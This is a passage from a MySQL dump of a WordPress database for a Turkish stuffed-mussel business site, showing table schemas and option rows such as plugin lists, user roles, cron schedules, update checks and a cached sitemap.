  `user_id` bigint(20) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`comment_ID`),
  KEY `comment_post_ID` (`comment_post_ID`),
  KEY `comment_approved_date_gmt` (`comment_approved`,`comment_date_gmt`),
  KEY `comment_date_gmt` (`comment_date_gmt`),
  KEY `comment_parent` (`comment_parent`),
  KEY `comment_author_email` (`comment_author_email`(10))
) ENGINE=MyISAM AUTO_INCREMENT=11 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;



DROP TABLE IF EXISTS `cmrfu_links`;

CREATE TABLE `cmrfu_links` (
  `link_id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `link_url` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `link_name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `link_image` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `link_target` varchar(25) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `link_description` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `link_visible` varchar(20) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'Y',
  `link_owner` bigint(20) unsigned NOT NULL DEFAULT '1',
  `link_rating` int(11) NOT NULL DEFAULT '0',
  `link_updated` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `link_rel` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `link_notes` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `link_rss` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  PRIMARY KEY (`link_id`),
  KEY `link_visible` (`link_visible`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;



DROP TABLE IF EXISTS `cmrfu_options`;

CREATE TABLE `cmrfu_options` (
  `option_id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `option_name` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `option_value` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `autoload` varchar(20) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'yes',
  PRIMARY KEY (`option_id`),
  UNIQUE KEY `option_name` (`option_name`)
) ENGINE=MyISAM AUTO_INCREMENT=19539 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

INSERT INTO `cmrfu_options` VALUES("1","siteurl","https://www.ismido.com.tr","yes");
INSERT INTO `cmrfu_options` VALUES("2","blogname","İsmido","yes");
INSERT INTO `cmrfu_options` VALUES("3","blogdescription","İstanbul Midye Dolma","yes");
INSERT INTO `cmrfu_options` VALUES("4","users_can_register","0","yes");
INSERT INTO `cmrfu_options` VALUES("5","admin_email","info@ismido.com.tr","yes");
INSERT INTO `cmrfu_options` VALUES("6","start_of_week","1","yes");
INSERT INTO `cmrfu_options` VALUES("7","use_balanceTags","0","yes");
INSERT INTO `cmrfu_options` VALUES("8","use_smilies","1","yes");
INSERT INTO `cmrfu_options` VALUES("9","require_name_email","1","yes");
INSERT INTO `cmrfu_options` VALUES("10","comments_notify","1","yes");
INSERT INTO `cmrfu_options` VALUES("11","posts_per_rss","10","yes");
INSERT INTO `cmrfu_options` VALUES("12","rss_use_excerpt","0","yes");
INSERT INTO `cmrfu_options` VALUES("13","mailserver_url","mail.example.com","yes");
INSERT INTO `cmrfu_options` VALUES("14","mailserver_login","login@example.com","yes");
INSERT INTO `cmrfu_options` VALUES("15","mailserver_pass","password","yes");
INSERT INTO `cmrfu_options` VALUES("16","mailserver_port","110","yes");
INSERT INTO `cmrfu_options` VALUES("17","default_category","1","yes");
INSERT INTO `cmrfu_options` VALUES("18","default_comment_status","open","yes");
INSERT INTO `cmrfu_options` VALUES("19","default_ping_status","open","yes");
INSERT INTO `cmrfu_options` VALUES("20","default_pingback_flag","1","yes");
INSERT INTO `cmrfu_options` VALUES("21","posts_per_page","10","yes");
INSERT INTO `cmrfu_options` VALUES("22","date_format","j F Y","yes");
INSERT INTO `cmrfu_options` VALUES("23","time_format","H:i","yes");
INSERT INTO `cmrfu_options` VALUES("24","links_updated_date_format","j F Y H:i","yes");
INSERT INTO `cmrfu_options` VALUES("28","comment_moderation","0","yes");
INSERT INTO `cmrfu_options` VALUES("29","moderation_notify","1","yes");
INSERT INTO `cmrfu_options` VALUES("30","permalink_structure","/%postname%/","yes");
INSERT INTO `cmrfu_options` VALUES("32","hack_file","0","yes");
INSERT INTO `cmrfu_options` VALUES("33","blog_charset","UTF-8","yes");
INSERT INTO `cmrfu_options` VALUES("34","moderation_keys","","no");
INSERT INTO `cmrfu_options` VALUES("35","active_plugins","a:10:{i:0;s:51:\"all-in-one-wp-security-and-firewall/wp-security.php\";i:1;s:36:\"contact-form-7/wp-contact-form-7.php\";i:2;s:16:\"gotmls/index.php\";i:3;s:35:\"jquery-colorbox/jquery-colorbox.php\";i:4;s:47:\"really-simple-captcha/really-simple-captcha.php\";i:5;s:23:\"revslider/revslider.php\";i:6;s:20:\"smtp-mailer/main.php\";i:7;s:41:\"wordpress-importer/wordpress-importer.php\";i:8;s:24:\"wordpress-seo/wp-seo.php\";i:9;s:27:\"wp-super-cache/wp-cache.php\";}","yes");
INSERT INTO `cmrfu_options` VALUES("2711","mail_from_name","herkon yapı","yes");
INSERT INTO `cmrfu_options` VALUES("36","home","https://www.ismido.com.tr","yes");
INSERT INTO `cmrfu_options` VALUES("37","category_base","","yes");
INSERT INTO `cmrfu_options` VALUES("38","ping_sites","http://rpc.pingomatic.com/","yes");
INSERT INTO `cmrfu_options` VALUES("40","comment_max_links","2","yes");
INSERT INTO `cmrfu_options` VALUES("41","gmt_offset","","yes");
INSERT INTO `cmrfu_options` VALUES("42","default_email_category","1","yes");
INSERT INTO `cmrfu_options` VALUES("43","recently_edited","a:3:{i:0;s:93:\"/home/srkn/herkonyapi.com/public_html/wp-content/themes/er-leaf/framework/theme-functions.php\";i:1;s:73:\"/home/srkn/herkonyapi.com/public_html/wp-content/themes/er-leaf/style.css\";i:2;b:0;}","yes");
INSERT INTO `cmrfu_options` VALUES("44","template","er-leaf","yes");
INSERT INTO `cmrfu_options` VALUES("45","stylesheet","er-leaf","yes");
INSERT INTO `cmrfu_options` VALUES("46","comment_whitelist","1","yes");
INSERT INTO `cmrfu_options` VALUES("47","blacklist_keys","","no");
INSERT INTO `cmrfu_options` VALUES("48","comment_registration","0","yes");
INSERT INTO `cmrfu_options` VALUES("49","html_type","text/html","yes");
INSERT INTO `cmrfu_options` VALUES("50","use_trackback","0","yes");
INSERT INTO `cmrfu_options` VALUES("51","default_role","subscriber","yes");
INSERT INTO `cmrfu_options` VALUES("52","db_version","38590","yes");
INSERT INTO `cmrfu_options` VALUES("53","uploads_use_yearmonth_folders","1","yes");
INSERT INTO `cmrfu_options` VALUES("54","upload_path","","yes");
INSERT INTO `cmrfu_options` VALUES("55","blog_public","1","yes");
INSERT INTO `cmrfu_options` VALUES("56","default_link_category","2","yes");
INSERT INTO `cmrfu_options` VALUES("57","show_on_front","page","yes");
INSERT INTO `cmrfu_options` VALUES("58","tag_base","","yes");
INSERT INTO `cmrfu_options` VALUES("59","show_avatars","1","yes");
INSERT INTO `cmrfu_options` VALUES("60","avatar_rating","G","yes");
INSERT INTO `cmrfu_options` VALUES("61","upload_url_path","","yes");
INSERT INTO `cmrfu_options` VALUES("62","thumbnail_size_w","150","yes");
INSERT INTO `cmrfu_options` VALUES("63","thumbnail_size_h","150","yes");
INSERT INTO `cmrfu_options` VALUES("64","thumbnail_crop","1","yes");
INSERT INTO `cmrfu_options` VALUES("65","medium_size_w","300","yes");
INSERT INTO `cmrfu_options` VALUES("66","medium_size_h","300","yes");
INSERT INTO `cmrfu_options` VALUES("67","avatar_default","mystery","yes");
INSERT INTO `cmrfu_options` VALUES("68","large_size_w","1024","yes");
INSERT INTO `cmrfu_options` VALUES("69","large_size_h","1024","yes");
INSERT INTO `cmrfu_options` VALUES("70","image_default_link_type","file","yes");
INSERT INTO `cmrfu_options` VALUES("71","image_default_size","","yes");
INSERT INTO `cmrfu_options` VALUES("72","image_default_align","","yes");
INSERT INTO `cmrfu_options` VALUES("73","close_comments_for_old_posts","0","yes");
INSERT INTO `cmrfu_options` VALUES("74","close_comments_days_old","14","yes");
INSERT INTO `cmrfu_options` VALUES("75","thread_comments","1","yes");
INSERT INTO `cmrfu_options` VALUES("76","thread_comments_depth","5","yes");
INSERT INTO `cmrfu_options` VALUES("77","page_comments","0","yes");
INSERT INTO `cmrfu_options` VALUES("78","comments_per_page","50","yes");
INSERT INTO `cmrfu_options` VALUES("79","default_comments_page","newest","yes");
INSERT INTO `cmrfu_options` VALUES("80","comment_order","asc","yes");
INSERT INTO `cmrfu_options` VALUES("81","sticky_posts","a:0:{}","yes");
INSERT INTO `cmrfu_options` VALUES("82","widget_categories","a:2:{i:2;a:4:{s:5:\"title\";s:0:\"\";s:5:\"count\";i:0;s:12:\"hierarchical\";i:0;s:8:\"dropdown\";i:0;}s:12:\"_multiwidget\";i:1;}","yes");
INSERT INTO `cmrfu_options` VALUES("83","widget_text","a:0:{}","yes");
INSERT INTO `cmrfu_options` VALUES("84","widget_rss","a:0:{}","yes");
INSERT INTO `cmrfu_options` VALUES("85","uninstall_plugins","a:3:{s:35:\"jquery-colorbox/jquery-colorbox.php\";a:2:{i:0;s:14:\"JQueryColorbox\";i:1;s:23:\"uninstallJqueryColorbox\";}s:27:\"wp-super-cache/wp-cache.php\";s:22:\"wpsupercache_uninstall\";s:39:\"underconstruction/underConstruction.php\";s:30:\"underConstructionPlugin_delete\";}","no");
INSERT INTO `cmrfu_options` VALUES("86","timezone_string","Europe/Istanbul","yes");
INSERT INTO `cmrfu_options` VALUES("87","page_for_posts","454","yes");
INSERT INTO `cmrfu_options` VALUES("88","page_on_front","524","yes");
INSERT INTO `cmrfu_options` VALUES("89","default_post_format","0","yes");
INSERT INTO `cmrfu_options` VALUES("90","link_manager_enabled","0","yes");
INSERT INTO `cmrfu_options` VALUES("91","initial_db_version","26691","yes");
INSERT INTO `cmrfu_options` VALUES("92","cmrfu_user_roles","a:5:{s:13:\"administrator\";a:2:{s:4:\"name\";s:13:\"Administrator\";s:12:\"capabilities\";a:62:{s:13:\"switch_themes\";b:1;s:11:\"edit_themes\";b:1;s:16:\"activate_plugins\";b:1;s:12:\"edit_plugins\";b:1;s:10:\"edit_users\";b:1;s:10:\"edit_files\";b:1;s:14:\"manage_options\";b:1;s:17:\"moderate_comments\";b:1;s:17:\"manage_categories\";b:1;s:12:\"manage_links\";b:1;s:12:\"upload_files\";b:1;s:6:\"import\";b:1;s:15:\"unfiltered_html\";b:1;s:10:\"edit_posts\";b:1;s:17:\"edit_others_posts\";b:1;s:20:\"edit_published_posts\";b:1;s:13:\"publish_posts\";b:1;s:10:\"edit_pages\";b:1;s:4:\"read\";b:1;s:8:\"level_10\";b:1;s:7:\"level_9\";b:1;s:7:\"level_8\";b:1;s:7:\"level_7\";b:1;s:7:\"level_6\";b:1;s:7:\"level_5\";b:1;s:7:\"level_4\";b:1;s:7:\"level_3\";b:1;s:7:\"level_2\";b:1;s:7:\"level_1\";b:1;s:7:\"level_0\";b:1;s:17:\"edit_others_pages\";b:1;s:20:\"edit_published_pages\";b:1;s:13:\"publish_pages\";b:1;s:12:\"delete_pages\";b:1;s:19:\"delete_others_pages\";b:1;s:22:\"delete_published_pages\";b:1;s:12:\"delete_posts\";b:1;s:19:\"delete_others_posts\";b:1;s:22:\"delete_published_posts\";b:1;s:20:\"delete_private_posts\";b:1;s:18:\"edit_private_posts\";b:1;s:18:\"read_private_posts\";b:1;s:20:\"delete_private_pages\";b:1;s:18:\"edit_private_pages\";b:1;s:18:\"read_private_pages\";b:1;s:12:\"delete_users\";b:1;s:12:\"create_users\";b:1;s:17:\"unfiltered_upload\";b:1;s:14:\"edit_dashboard\";b:1;s:14:\"update_plugins\";b:1;s:14:\"delete_plugins\";b:1;s:15:\"install_plugins\";b:1;s:13:\"update_themes\";b:1;s:14:\"install_themes\";b:1;s:11:\"update_core\";b:1;s:10:\"list_users\";b:1;s:12:\"remove_users\";b:1;s:13:\"promote_users\";b:1;s:18:\"edit_theme_options\";b:1;s:13:\"delete_themes\";b:1;s:6:\"export\";b:1;s:15:\"wpseo_bulk_edit\";b:1;}}s:6:\"editor\";a:2:{s:4:\"name\";s:6:\"Editor\";s:12:\"capabilities\";a:35:{s:17:\"moderate_comments\";b:1;s:17:\"manage_categories\";b:1;s:12:\"manage_links\";b:1;s:12:\"upload_files\";b:1;s:15:\"unfiltered_html\";b:1;s:10:\"edit_posts\";b:1;s:17:\"edit_others_posts\";b:1;s:20:\"edit_published_posts\";b:1;s:13:\"publish_posts\";b:1;s:10:\"edit_pages\";b:1;s:4:\"read\";b:1;s:7:\"level_7\";b:1;s:7:\"level_6\";b:1;s:7:\"level_5\";b:1;s:7:\"level_4\";b:1;s:7:\"level_3\";b:1;s:7:\"level_2\";b:1;s:7:\"level_1\";b:1;s:7:\"level_0\";b:1;s:17:\"edit_others_pages\";b:1;s:20:\"edit_published_pages\";b:1;s:13:\"publish_pages\";b:1;s:12:\"delete_pages\";b:1;s:19:\"delete_others_pages\";b:1;s:22:\"delete_published_pages\";b:1;s:12:\"delete_posts\";b:1;s:19:\"delete_others_posts\";b:1;s:22:\"delete_published_posts\";b:1;s:20:\"delete_private_posts\";b:1;s:18:\"edit_private_posts\";b:1;s:18:\"read_private_posts\";b:1;s:20:\"delete_private_pages\";b:1;s:18:\"edit_private_pages\";b:1;s:18:\"read_private_pages\";b:1;s:15:\"wpseo_bulk_edit\";b:1;}}s:6:\"author\";a:2:{s:4:\"name\";s:6:\"Author\";s:12:\"capabilities\";a:10:{s:12:\"upload_files\";b:1;s:10:\"edit_posts\";b:1;s:20:\"edit_published_posts\";b:1;s:13:\"publish_posts\";b:1;s:4:\"read\";b:1;s:7:\"level_2\";b:1;s:7:\"level_1\";b:1;s:7:\"level_0\";b:1;s:12:\"delete_posts\";b:1;s:22:\"delete_published_posts\";b:1;}}s:11:\"contributor\";a:2:{s:4:\"name\";s:11:\"Contributor\";s:12:\"capabilities\";a:5:{s:10:\"edit_posts\";b:1;s:4:\"read\";b:1;s:7:\"level_1\";b:1;s:7:\"level_0\";b:1;s:12:\"delete_posts\";b:1;}}s:10:\"subscriber\";a:2:{s:4:\"name\";s:10:\"Subscriber\";s:12:\"capabilities\";a:2:{s:4:\"read\";b:1;s:7:\"level_0\";b:1;}}}","yes");
INSERT INTO `cmrfu_options` VALUES("93","widget_search","a:2:{i:2;a:1:{s:5:\"title\";s:0:\"\";}s:12:\"_multiwidget\";i:1;}","yes");
INSERT INTO `cmrfu_options` VALUES("94","widget_recent-posts","a:1:{s:12:\"_multiwidget\";i:1;}","yes");
INSERT INTO `cmrfu_options` VALUES("95","widget_recent-comments","a:1:{s:12:\"_multiwidget\";i:1;}","yes");
INSERT INTO `cmrfu_options` VALUES("96","widget_archives","a:1:{s:12:\"_multiwidget\";i:1;}","yes");
INSERT INTO `cmrfu_options` VALUES("97","widget_meta","a:1:{s:12:\"_multiwidget\";i:1;}","yes");
INSERT INTO `cmrfu_options` VALUES("98","sidebars_widgets","a:11:{s:19:\"wp_inactive_widgets\";a:0:{}s:15:\"default-sidebar\";a:2:{i:0;s:8:\"search-2\";i:1;s:12:\"categories-2\";}s:8:\"topbar-1\";a:0:{}s:8:\"topbar-2\";a:0:{}s:8:\"topbar-3\";a:0:{}s:8:\"topbar-4\";a:0:{}s:8:\"footer-1\";a:0:{}s:8:\"footer-2\";a:0:{}s:8:\"footer-3\";a:0:{}s:8:\"footer-4\";a:0:{}s:13:\"array_version\";i:3;}","yes");
INSERT INTO `cmrfu_options` VALUES("99","cron","a:7:{i:1490168691;a:1:{s:24:\"aiowps_hourly_cron_event\";a:1:{s:32:\"40cd750bba9870f18aada2478b24840a\";a:3:{s:8:\"schedule\";s:6:\"hourly\";s:4:\"args\";a:0:{}s:8:\"interval\";i:3600;}}}i:1490180909;a:3:{s:16:\"wp_version_check\";a:1:{s:32:\"40cd750bba9870f18aada2478b24840a\";a:3:{s:8:\"schedule\";s:10:\"twicedaily\";s:4:\"args\";a:0:{}s:8:\"interval\";i:43200;}}s:17:\"wp_update_plugins\";a:1:{s:32:\"40cd750bba9870f18aada2478b24840a\";a:3:{s:8:\"schedule\";s:10:\"twicedaily\";s:4:\"args\";a:0:{}s:8:\"interval\";i:43200;}}s:16:\"wp_update_themes\";a:1:{s:32:\"40cd750bba9870f18aada2478b24840a\";a:3:{s:8:\"schedule\";s:10:\"twicedaily\";s:4:\"args\";a:0:{}s:8:\"interval\";i:43200;}}}i:1490180954;a:1:{s:19:\"wp_scheduled_delete\";a:1:{s:32:\"40cd750bba9870f18aada2478b24840a\";a:3:{s:8:\"schedule\";s:5:\"daily\";s:4:\"args\";a:0:{}s:8:\"interval\";i:86400;}}}i:1490204968;a:1:{s:30:\"wp_scheduled_auto_draft_delete\";a:1:{s:32:\"40cd750bba9870f18aada2478b24840a\";a:3:{s:8:\"schedule\";s:5:\"daily\";s:4:\"args\";a:0:{}s:8:\"interval\";i:86400;}}}i:1490215491;a:1:{s:23:\"aiowps_daily_cron_event\";a:1:{s:32:\"40cd750bba9870f18aada2478b24840a\";a:3:{s:8:\"schedule\";s:5:\"daily\";s:4:\"args\";a:0:{}s:8:\"interval\";i:86400;}}}i:1490215648;a:1:{s:18:\"wpseo_onpage_fetch\";a:1:{s:32:\"40cd750bba9870f18aada2478b24840a\";a:3:{s:8:\"schedule\";s:6:\"weekly\";s:4:\"args\";a:0:{}s:8:\"interval\";i:604800;}}}s:7:\"version\";i:2;}","yes");
INSERT INTO `cmrfu_options` VALUES("18641","_site_transient_timeout_browser_e9759623ada108579a8a752b70481b56","1486413935","no");
INSERT INTO `cmrfu_options` VALUES("17692","fresh_site","0","yes");
INSERT INTO `cmrfu_options` VALUES("19530","_site_transient_update_themes","O:8:\"stdClass\":4:{s:12:\"last_checked\";i:1490139573;s:7:\"checked\";a:1:{s:7:\"er-leaf\";s:5:\"1.1.2\";}s:8:\"response\";a:0:{}s:12:\"translations\";a:0:{}}","no");
INSERT INTO `cmrfu_options` VALUES("19531","_site_transient_update_plugins","O:8:\"stdClass\":4:{s:12:\"last_checked\";i:1490139571;s:8:\"response\";a:2:{s:20:\"smtp-mailer/main.php\";O:8:\"stdClass\":8:{s:2:\"id\";s:5:\"67448\";s:4:\"slug\";s:11:\"smtp-mailer\";s:6:\"plugin\";s:20:\"smtp-mailer/main.php\";s:11:\"new_version\";s:5:\"1.0.3\";s:3:\"url\";s:42:\"https://wordpress.org/plugins/smtp-mailer/\";s:7:\"package\";s:54:\"https://downloads.wordpress.org/plugin/smtp-mailer.zip\";s:6:\"tested\";s:5:\"4.7.3\";s:13:\"compatibility\";O:8:\"stdClass\":1:{s:6:\"scalar\";O:8:\"stdClass\":1:{s:6:\"scalar\";b:0;}}}s:24:\"wordpress-seo/wp-seo.php\";O:8:\"stdClass\":8:{s:2:\"id\";s:4:\"5899\";s:4:\"slug\";s:13:\"wordpress-seo\";s:6:\"plugin\";s:24:\"wordpress-seo/wp-seo.php\";s:11:\"new_version\";s:3:\"4.5\";s:3:\"url\";s:44:\"https://wordpress.org/plugins/wordpress-seo/\";s:7:\"package\";s:60:\"https://downloads.wordpress.org/plugin/wordpress-seo.4.5.zip\";s:6:\"tested\";s:5:\"4.7.3\";s:13:\"compatibility\";O:8:\"stdClass\":1:{s:6:\"scalar\";O:8:\"stdClass\":1:{s:6:\"scalar\";b:0;}}}}s:12:\"translations\";a:2:{i:0;a:7:{s:4:\"type\";s:6:\"plugin\";s:4:\"slug\";s:14:\"contact-form-7\";s:8:\"language\";s:5:\"tr_TR\";s:7:\"version\";s:5:\"4.6.1\";s:7:\"updated\";s:19:\"2016-12-20 20:38:21\";s:7:\"package\";s:81:\"https://downloads.wordpress.org/translation/plugin/contact-form-7/4.6.1/tr_TR.zip\";s:10:\"autoupdate\";b:1;}i:1;a:7:{s:4:\"type\";s:6:\"plugin\";s:4:\"slug\";s:13:\"wordpress-seo\";s:8:\"language\";s:5:\"tr_TR\";s:7:\"version\";s:5:\"3.2.5\";s:7:\"updated\";s:19:\"2016-04-24 14:07:46\";s:7:\"package\";s:80:\"https://downloads.wordpress.org/translation/plugin/wordpress-seo/3.2.5/tr_TR.zip\";s:10:\"autoupdate\";b:1;}}s:9:\"no_update\";a:10:{s:19:\"akismet/akismet.php\";O:8:\"stdClass\":6:{s:2:\"id\";s:2:\"15\";s:4:\"slug\";s:7:\"akismet\";s:6:\"plugin\";s:19:\"akismet/akismet.php\";s:11:\"new_version\";s:3:\"3.3\";s:3:\"url\";s:38:\"https://wordpress.org/plugins/akismet/\";s:7:\"package\";s:54:\"https://downloads.wordpress.org/plugin/akismet.3.3.zip\";}s:51:\"all-in-one-wp-security-and-firewall/wp-security.php\";O:8:\"stdClass\":6:{s:2:\"id\";s:5:\"41309\";s:4:\"slug\";s:35:\"all-in-one-wp-security-and-firewall\";s:6:\"plugin\";s:51:\"all-in-one-wp-security-and-firewall/wp-security.php\";s:11:\"new_version\";s:5:\"4.2.5\";s:3:\"url\";s:66:\"https://wordpress.org/plugins/all-in-one-wp-security-and-firewall/\";s:7:\"package\";s:78:\"https://downloads.wordpress.org/plugin/all-in-one-wp-security-and-firewall.zip\";}s:16:\"gotmls/index.php\";O:8:\"stdClass\":7:{s:2:\"id\";s:5:\"29304\";s:4:\"slug\";s:6:\"gotmls\";s:6:\"plugin\";s:16:\"gotmls/index.php\";s:11:\"new_version\";s:7:\"4.16.53\";s:3:\"url\";s:37:\"https://wordpress.org/plugins/gotmls/\";s:7:\"package\";s:57:\"https://downloads.wordpress.org/plugin/gotmls.4.16.53.zip\";s:14:\"upgrade_notice\";s:153:\"Fixed the details window to scrolls to the highlighted code, set default Potential Threat scan to disabled, and encoded definitions array for DB storage.\";}s:36:\"contact-form-7/wp-contact-form-7.php\";O:8:\"stdClass\":6:{s:2:\"id\";s:3:\"790\";s:4:\"slug\";s:14:\"contact-form-7\";s:6:\"plugin\";s:36:\"contact-form-7/wp-contact-form-7.php\";s:11:\"new_version\";s:3:\"4.7\";s:3:\"url\";s:45:\"https://wordpress.org/plugins/contact-form-7/\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/plugin/contact-form-7.4.7.zip\";}s:9:\"hello.php\";O:8:\"stdClass\":6:{s:2:\"id\";s:4:\"3564\";s:4:\"slug\";s:11:\"hello-dolly\";s:6:\"plugin\";s:9:\"hello.php\";s:11:\"new_version\";s:3:\"1.6\";s:3:\"url\";s:42:\"https://wordpress.org/plugins/hello-dolly/\";s:7:\"package\";s:58:\"https://downloads.wordpress.org/plugin/hello-dolly.1.6.zip\";}s:35:\"jquery-colorbox/jquery-colorbox.php\";O:8:\"stdClass\":6:{s:2:\"id\";s:5:\"12036\";s:4:\"slug\";s:15:\"jquery-colorbox\";s:6:\"plugin\";s:35:\"jquery-colorbox/jquery-colorbox.php\";s:11:\"new_version\";s:5:\"4.6.2\";s:3:\"url\";s:46:\"https://wordpress.org/plugins/jquery-colorbox/\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/plugin/jquery-colorbox.4.6.2.zip\";}s:39:\"lockdown-wp-admin/lockdown-wp-admin.php\";O:8:\"stdClass\":6:{s:2:\"id\";s:5:\"19836\";s:4:\"slug\";s:17:\"lockdown-wp-admin\";s:6:\"plugin\";s:39:\"lockdown-wp-admin/lockdown-wp-admin.php\";s:11:\"new_version\";s:5:\"2.3.2\";s:3:\"url\";s:48:\"https://wordpress.org/plugins/lockdown-wp-admin/\";s:7:\"package\";s:66:\"https://downloads.wordpress.org/plugin/lockdown-wp-admin.2.3.2.zip\";}s:47:\"really-simple-captcha/really-simple-captcha.php\";O:8:\"stdClass\":6:{s:2:\"id\";s:4:\"7028\";s:4:\"slug\";s:21:\"really-simple-captcha\";s:6:\"plugin\";s:47:\"really-simple-captcha/really-simple-captcha.php\";s:11:\"new_version\";s:3:\"1.9\";s:3:\"url\";s:52:\"https://wordpress.org/plugins/really-simple-captcha/\";s:7:\"package\";s:68:\"https://downloads.wordpress.org/plugin/really-simple-captcha.1.9.zip\";}s:41:\"wordpress-importer/wordpress-importer.php\";O:8:\"stdClass\":6:{s:2:\"id\";s:5:\"14975\";s:4:\"slug\";s:18:\"wordpress-importer\";s:6:\"plugin\";s:41:\"wordpress-importer/wordpress-importer.php\";s:11:\"new_version\";s:5:\"0.6.3\";s:3:\"url\";s:49:\"https://wordpress.org/plugins/wordpress-importer/\";s:7:\"package\";s:67:\"https://downloads.wordpress.org/plugin/wordpress-importer.0.6.3.zip\";}s:27:\"wp-super-cache/wp-cache.php\";O:8:\"stdClass\":7:{s:2:\"id\";s:4:\"1221\";s:4:\"slug\";s:14:\"wp-super-cache\";s:6:\"plugin\";s:27:\"wp-super-cache/wp-cache.php\";s:11:\"new_version\";s:5:\"1.4.9\";s:3:\"url\";s:45:\"https://wordpress.org/plugins/wp-super-cache/\";s:7:\"package\";s:63:\"https://downloads.wordpress.org/plugin/wp-super-cache.1.4.9.zip\";s:14:\"upgrade_notice\";s:139:\"Fixed XSS on the settings page, settings page updates, file locking fixes and PHP 7.1 fix, caching fixes on static homepage blogs and more.\";}}}","no");
INSERT INTO `cmrfu_options` VALUES("19436","_transient_timeout_yst_sm_portfolio_1:3cCoc_35Vtu","1489652672","no");
INSERT INTO `cmrfu_options` VALUES("19437","_transient_yst_sm_portfolio_1:3cCoc_35Vtu","C:24:\"WPSEO_Sitemap_Cache_Data\":1723:{a:2:{s:6:\"status\";s:2:\"ok\";s:3:\"xml\";s:1675:\"<urlset xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:image=\"http://www.google.com/schemas/sitemap-image/1.1\" xsi:schemaLocation=\"http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd\" xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">
	<url>
		<loc>https://www.ismido.com.tr/portfolio-item/</loc>
		<lastmod>2016-11-22T23:31:59+02:00</lastmod>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/portfolio-item/kara-midye/</loc>
		<lastmod>2016-11-22T23:17:23+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2013/10/urunler_1.jpg</image:loc>
			<image:title><![CDATA[urunler_1]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/portfolio-item/ic-midye/</loc>
		<lastmod>2016-11-22T23:29:06+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2013/10/urunler_2.jpg</image:loc>
			<image:title><![CDATA[urunler_2]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/portfolio-item/jumbo-midye-dolma/</loc>
		<lastmod>2016-11-22T23:30:56+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2013/10/jumbo_midye_dolma.jpg</image:loc>
			<image:title><![CDATA[jumbo_midye_dolma]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/portfolio-item/maxi-midye-dolma/</loc>
		<lastmod>2016-11-22T23:31:59+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2013/10/urunler_4.jpg</image:loc>
			<image:title><![CDATA[urunler_4]]></image:title>
		</image:image>
	</url>
</urlset>\";}}","no");
INSERT INTO `cmrfu_options` VALUES("19399","_transient_timeout_GOTMLS_upgrade_notice_4.16.49_4.16.53","1489220699","no");
INSERT INTO `cmrfu_options` VALUES("18310","_transient_GOTMLS_upgrade_notice_4.16.48_4.16.49","<div class=\"GOTMLS_upgrade_notice\"><li><b>4.16.49:</b> Fixed syntax error in the XMLRPC patch for newer versions of Apache.</li></div>","no");
INSERT INTO `cmrfu_options` VALUES("19529","_site_transient_update_core","O:8:\"stdClass\":4:{s:7:\"updates\";a:1:{i:0;O:8:\"stdClass\":10:{s:8:\"response\";s:6:\"latest\";s:8:\"download\";s:65:\"https://downloads.wordpress.org/release/tr_TR/wordpress-4.7.3.zip\";s:6:\"locale\";s:5:\"tr_TR\";s:8:\"packages\";O:8:\"stdClass\":5:{s:4:\"full\";s:65:\"https://downloads.wordpress.org/release/tr_TR/wordpress-4.7.3.zip\";s:10:\"no_content\";b:0;s:11:\"new_bundled\";b:0;s:7:\"partial\";b:0;s:8:\"rollback\";b:0;}s:7:\"current\";s:5:\"4.7.3\";s:7:\"version\";s:5:\"4.7.3\";s:11:\"php_version\";s:5:\"5.2.4\";s:13:\"mysql_version\";s:3:\"5.0\";s:11:\"new_bundled\";s:3:\"4.7\";s:15:\"partial_version\";s:0:\"\";}}s:12:\"last_checked\";i:1490139569;s:15:\"version_checked\";s:5:\"4.7.3\";s:12:\"translations\";a:0:{}}","no");
INSERT INTO `cmrfu_options` VALUES("18642","_site_transient_browser_e9759623ada108579a8a752b70481b56","a:9:{s:8:\"platform\";s:9:\"Macintosh\";s:4:\"name\";s:6:\"Chrome\";s:7:\"version\";s:12:\"55.0.2883.95\";s:10:\"update_url\";s:28:\"http://www.google.com/chrome\";s:7:\"img_src\";s:49:\"http://s.wordpress.org/images/browsers/chrome.png\";s:11:\"img_src_ssl\";s:48:\"https://wordpress.org/images/browsers/chrome.png\";s:15:\"current_version\";s:2:\"18\";s:7:\"upgrade\";b:0;s:8:\"insecure\";b:0;}","no");
